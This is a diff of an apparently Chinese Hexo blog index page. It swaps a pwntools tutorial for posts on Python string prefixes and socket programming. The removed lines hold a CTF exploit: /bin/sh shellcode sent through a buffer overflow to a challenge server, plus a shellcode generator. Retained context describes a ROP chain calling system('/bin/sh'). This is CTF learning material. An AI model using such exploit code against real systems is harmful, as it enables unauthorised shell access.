@@ -148,31 +148,30 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Pythonpwn使用方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Python字符串开头b r u含义" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/Python字符串开头b r u含义/">Python字符串开头b r u含义</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/Python字符串开头b r u含义/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Pythonpwn使用方法"><a href="#Pythonpwn使用方法" class="headerlink" title="Pythonpwn使用方法"></a><strong>Pythonpwn使用方法</strong></h3><h4 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a><strong>基础用法：</strong></h4><p>以<strong>实验吧 pilot</strong>为例：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *  <span class="comment">#导入pwn</span></span><br><span class="line"><span class="comment">#remote建立远程连接，需要参数(ip,port)</span></span><br><span class="line"><span class="comment">#如果本地执行的话:</span></span><br><span class="line"><span class="comment">#p = process('./pilot')</span></span><br><span class="line">p  =  remote(<span class="string">"106.2.25.7"</span>,<span class="number">8003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Location:'</span>)  <span class="comment">#接收信息直到出现关键字'Location'</span></span><br><span class="line">addr  =  int  (p.recvuntil(<span class="string">'\n'</span>)[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)  <span class="comment">#将之后接收到的信息的14位16进制数转成int存储起来</span></span><br><span class="line"><span class="keyword">print</span>  addr</span><br><span class="line"></span><br><span class="line">shellcode  =  <span class="string">'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#布局</span></span><br><span class="line">payload  =  shellcode  +  ((<span class="number">40</span>  -  len(shellcode))*<span class="string">'A'</span>)  +  p64(addr)</span><br><span class="line"><span class="comment">#接收信息直到出现关键字'Command:'</span></span><br><span class="line">p.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="comment">#将payload发送出去</span></span><br><span class="line"><span class="comment">#p.sendline()发送之后默认在后面加换行</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.send(payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#与其进行交互</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">利用思路：cyclic 100计算溢出偏移长度,Location定位字符串开始的位置,布局为 shellcode+padding+addr</span></span><br><span class="line"><span class="string">执行到返回,劫持返回地址到addr,addr指向Location,即字符串开始的位置,之后执行shellcode,拿到shell</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cat home/flag</span></span><br></pre></td></tr></table></figure>
+        <h3 id="Python字符串开头b-r-u含义"><a href="#Python字符串开头b-r-u含义" class="headerlink" title="Python字符串开头b r u含义"></a>Python字符串开头b r u含义</h3><h4 id="字符串开头b-r-u各含义："><a href="#字符串开头b-r-u各含义：" class="headerlink" title="字符串开头b r u各含义："></a><strong>字符串开头b r u各含义：</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span> <span class="string">b'input\n'</span>  <span class="comment"># bytes字节符，打印以b开头。</span></span><br><span class="line"><span class="string">b'input\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> <span class="string">r'input\n'</span>  <span class="comment"># 非转义原生字符，经处理'\n'变成了'\'和'n'。也就是\n表示的是两个字符，而不是换行。</span></span><br><span class="line"><span class="string">'input\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> <span class="string">u'input\n'</span>  <span class="comment"># unicode编码字符，python3默认字符串编码方式。</span></span><br><span class="line"><span class="string">'input\n'</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="shellcode生成操作-汇编转操作码-："><a href="#shellcode生成操作-汇编转操作码-：" class="headerlink" title="shellcode生成操作(汇编转操作码)："></a><strong>shellcode生成操作(汇编转操作码)：</strong></h4><p>以<strong>实验吧</strong>  <strong>加减乘除</strong>为例：<br><img src="/2019/09/10/Pythonpwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png" alt><br>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">code  =  <span class="string">'''.global _start</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">jmp test1</span></span><br><span class="line"><span class="string">test2:</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">mov al, 0xa</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov al, 0x1</span></span><br><span class="line"><span class="string">xor ebx, ebx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">test1:</span></span><br><span class="line"><span class="string">call test2</span></span><br><span class="line"><span class="string">.string "delfile" '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置环境</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">arch设置架构为x86</span></span><br><span class="line"><span class="string">os设置系统为linux</span></span><br><span class="line"><span class="string">endian设置大小端模式为小端</span></span><br><span class="line"><span class="string">word_size设置字长为32</span></span><br><span class="line"><span class="string">log_level设置日志输出等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context(arch  =  <span class="string">'x86'</span>,  os  =  <span class="string">'linux'</span>,  endian  =  <span class="string">'little'</span>,  word_size  =  <span class="number">32</span>,  log_level  =  <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将code编码输出</span></span><br><span class="line">shellcode  =  asm(code).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span>  shellcode</span><br><span class="line"><span class="keyword">print</span>  type(shellcode)</span><br><span class="line"><span class="comment">#格式化，加上'\x'</span></span><br><span class="line">r  =  <span class="string">''</span></span><br><span class="line">count  =  <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span>  shellcode:</span><br><span class="line">    <span class="keyword">if</span>  count  %  <span class="number">2</span>  ==  <span class="number">0</span>:</span><br><span class="line">        r  +=  <span class="string">r'\x'</span></span><br><span class="line">    r  +=  i</span><br><span class="line">    count  +=  <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span>  r</span><br></pre></td></tr></table></figure>
+<h4 id="str与bytes转换："><a href="#str与bytes转换：" class="headerlink" title="str与bytes转换："></a><strong>str与bytes转换：</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在python3环境下运行</span></span><br><span class="line"></span><br><span class="line">a=<span class="string">'input'</span></span><br><span class="line"><span class="keyword">print</span>  (a)</span><br><span class="line"><span class="keyword">print</span>  (type(a))</span><br><span class="line"></span><br><span class="line">b=<span class="string">b'input'</span></span><br><span class="line"><span class="keyword">print</span>  (b)</span><br><span class="line"><span class="keyword">print</span>  (type(b))</span><br><span class="line"></span><br><span class="line">c=<span class="string">u'input'</span></span><br><span class="line"><span class="keyword">print</span>  (c)</span><br><span class="line"><span class="keyword">print</span>  ((type)(c))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str与bytes转换：</span></span><br><span class="line">d=<span class="string">'€20'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span>  (d,type(d))</span><br><span class="line">e=<span class="string">b'\xe2\x82\xac20'</span>.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span>  (e,type(e))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str转bytes:</span></span><br><span class="line">f=<span class="string">'123'</span></span><br><span class="line"><span class="keyword">print</span>  (f,type(f))</span><br><span class="line">g=bytes(f,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span>  (g,type(g))</span><br><span class="line"><span class="keyword">print</span>  (str.encode(f),type(str.encode(f)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#bytes转str:</span></span><br><span class="line">h=<span class="string">b'123'</span></span><br><span class="line"><span class="keyword">print</span>  (h,type(h))</span><br><span class="line">i=str(h,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span>  (i,type(i))</span><br><span class="line"><span class="keyword">print</span>  (bytes.decode(h),type(bytes.decode(h)))</span><br></pre></td></tr></table></figure>
 
-<p>运行结果如下：<br><img src="/2019/09/10/Pythonpwn使用方法/9075b03109db06effc5021ad08269d07.png" alt><br>注意删掉<strong>\x00坏字符</strong>，提交拿到key值：<br><img src="/2019/09/10/Pythonpwn使用方法/1838d70fb3f9614721dd4efe9551c916.png" alt></p>
-<h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a><strong>其他：</strong></h4><h5 id="在寻找溢出长度时："><a href="#在寻找溢出长度时：" class="headerlink" title="在寻找溢出长度时："></a><strong>在寻找溢出长度时：</strong></h5><p>#生成指定长度的不重复序列</p>
-<p>#cyclic 100</p>
-<p>#用于查找指定序列的偏移量</p>
-<p>#cyclic -l gaaa<br>使用截图如下：<br><img src="/2019/09/10/Pythonpwn使用方法/1368de3c660aae209011eb00e1f46bb2.png" alt></p>
-<h5 id="ELF文件操作："><a href="#ELF文件操作：" class="headerlink" title="ELF文件操作："></a><strong>ELF文件操作：</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获得该ELF的句柄</span></span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libgcc_s.so.1");</span></span><br><span class="line"><span class="comment">#将jmp esp对应的汇编代码送给jmp_esp</span></span><br><span class="line"><span class="comment">#jmp_esp = asm("jmp esp")</span></span><br><span class="line"><span class="comment">#在libc中搜索对应的汇编代码，并将为该汇编代码的地址返回给jmp_eso_addr_offset</span></span><br><span class="line"><span class="comment">#jmp_esp_addr_offset=libc.search(jmp_esp).next()</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="自动生成shellcode"><a href="#自动生成shellcode" class="headerlink" title="自动生成shellcode"></a><strong>自动生成shellcode</strong></h5><p><img src="/2019/09/10/Pythonpwn使用方法/09c4c9f5be43b6c0fefa5ce448f06a4d.png" alt></p>
-<h5 id="数据打包："><a href="#数据打包：" class="headerlink" title="数据打包："></a><strong>数据打包：</strong></h5><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便<br>用法：</p>
-<ul>
-<li>p32/p64: 打包一个整数,分别打包为32或64位</li>
-<li>u32/u64: 解包一个字符串,得到整数</li>
-</ul>
-<p>使用截图如下：<br><img src="/2019/09/10/Pythonpwn使用方法/1c01dec99118cee6ee97d2eba68d2546.png" alt></p>
 
       
 
@@ -181,11 +180,109 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/Pythonpwn使用方法/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/Python字符串开头b r u含义/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/Python网络编程/">Python网络编程</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/Python网络编程/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Python网络编程"><a href="#Python网络编程" class="headerlink" title="Python网络编程"></a>Python网络编程</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket"><a href="#1-创建一个基于TCP连接的Socket" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket  <span class="comment">#导入socket库</span></span><br><span class="line"><span class="comment">#创建一个socket</span></span><br><span class="line"></span><br><span class="line">s  =  socket.socket（socket.AF_INET,socket.SOCK_STREAM）<span class="comment">#AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。SOCK_STREAM指定使用面向流的TCP协议</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line"><span class="keyword">print</span>  host</span><br><span class="line"><span class="comment">#设置端口</span></span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#客户端建立连接需要主动，所以是主动connect</span></span><br><span class="line">s.connect((host,port))  <span class="comment">#(host,port)是一个元组turple</span></span><br><span class="line"><span class="comment">#连接成功后发送数据</span></span><br><span class="line">s.send(<span class="string">'Hello,I\'m Client!'</span>)</span><br><span class="line"><span class="comment">#接受服务端发来的数据</span></span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)  <span class="comment">#设置最大值为1024个字节，超出部分放入缓冲区</span></span><br><span class="line"><span class="comment">#关闭连接</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-UDP编程"><a href="#2-UDP编程" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)<span class="comment">#创建Socket时，SOCK_DGRAM指定了这个Socket的类型是UDP</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#s.sendto需要发送的数据与给谁发</span></span><br><span class="line">s.sendto(<span class="string">b'Client'</span>,(host,port))</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket-1"><a href="#1-创建一个基于TCP连接的Socket-1" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"><span class="keyword">import</span>  thread</span><br><span class="line">s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line"><span class="keyword">print</span>  host</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"><span class="comment">#服务端被动建立连接，所以需要指定该程序与哪个socket绑定，需要用bind</span></span><br><span class="line"></span><br><span class="line">s.bind((host,port))  <span class="comment">#(host,port)是一个元组turple</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设立最大连接数</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接受一个新连接</span></span><br><span class="line">sock,addr=s.accept()</span><br><span class="line">sock.send(<span class="string">b'Welcome!'</span>)</span><br><span class="line">data  =  sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span>  data</span><br><span class="line">sock.send(<span class="string">b'I\'m Server!'</span>)</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+
+<p>测试服务器的客户端程序如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line"></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line">s.connect((host,  port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line"></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'I\'m testServer!'</span>)</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-UDP编程-1"><a href="#2-UDP编程-1" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment">#绑定端口:</span></span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line">s.bind((host,port))</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'Bind UDP on 55555'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不需要建立连接，直接接收数据</span></span><br><span class="line"><span class="comment">#s.recvfrom()拿到发送的信息与谁发的(地址与端口)</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span>  (<span class="string">'Received from %s:%s'</span>  %  addr)</span><br><span class="line"><span class="comment">#s.sendto需要发送的数据与给谁发</span></span><br><span class="line">s.sendto(<span class="string">b'Hello,%s'</span>  %  data,addr)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>测试服务器的客户端程序如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line">s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">host  =  socket.gethostname()</span><br><span class="line">port  =  <span class="number">55555</span></span><br><span class="line"></span><br><span class="line">s.sendto(<span class="string">b'testServer'</span>,(host,port))</span><br><span class="line"><span class="keyword">print</span>  s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python网络编程/">展开全文 >></a>
         </p>
       
 
@@ -218,9 +315,24 @@
     <article id="post-ROP (Return-oriented programming ) 返回导向编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/">ROP (Return-oriented programming ) 返回导向编程</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a><strong>ROP (Return-oriented programming ) 返回导向编程</strong></h3><p>以<strong>实验吧 ropbaby</strong>为例：<br>![](ROP (Return-oriented programming ) 返回导向编程/d514bf7df4e170521042293fdc69e3d7.png)<br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br>![](ROP (Return-oriented programming ) 返回导向编程/79671673cb3dbdc18b17630713a6fa10.png)</p>
+        <h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a>ROP (Return-oriented programming ) 返回导向编程</h3><p>以<strong>实验吧 ropbaby</strong>为例：<br>![](ROP (Return-oriented programming ) 返回导向编程/d514bf7df4e170521042293fdc69e3d7.png)<br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br>![](ROP (Return-oriented programming ) 返回导向编程/79671673cb3dbdc18b17630713a6fa10.png)</p>
 <p>那么<strong>利用思路</strong>就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(addr_ret)+p64(‘/bin/sh’)+p64(‘addr_system’)</p>
 <p>在memcpy完想要ret时，会ret到addr_ret的地址，然后将’/bin/sh’pop出来当作参数，在下一个ret时，ret到addr_system这里，因为已经布局好了其参数’/bin/sh’，所以相当于执行system(‘/bin/sh’)，拿到shell.</p>
 <p>首先<strong>寻找溢出点</strong>：<br>![](ROP (Return-oriented programming ) 返回导向编程/ee6566df7256098be4ab03686b8a9c8a.png)<br>经过验证,将nptr复制给savedregs时会发生溢出。<br>接着<strong>查找可控字段，计算偏移量</strong>。<br>![](ROP (Return-oriented programming ) 返回导向编程/bc4a38b47b5fb2858aa7c89ae1d80697.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/c8dbb3b018a921c371b140115253b52f.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/09c4d08f7fb7e50ef331935c777cf403.png)<br>偏移量为8<br>验证如下：<br>![](ROP (Return-oriented programming ) 返回导向编程/d9ce806250e3ab925ac3fbba9336c63a.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/2f1da7027901200e157d3edb9908815f.png)<br><strong>寻找libc中’/bin/sh’的偏移量</strong>(在32位机器上可以找到，我也不知道为什么64位不行)<br>![](ROP (Return-oriented programming ) 返回导向编程/5a73527385c79cd9bcbd0bc832ebaa92.png)<br>offset_binsh = 0x18cd17<br>接着需要<strong>查找所有的 ret</strong>，使用ROPgadget(32位可以，64不知道为什么不行)<br>![](ROP (Return-oriented programming ) 返回导向编程/b476dafead58d72a02f5a03b4ad48d63.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/d7c675fffc61a43ce0238648eb20d885.png)</p>
@@ -238,6 +350,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
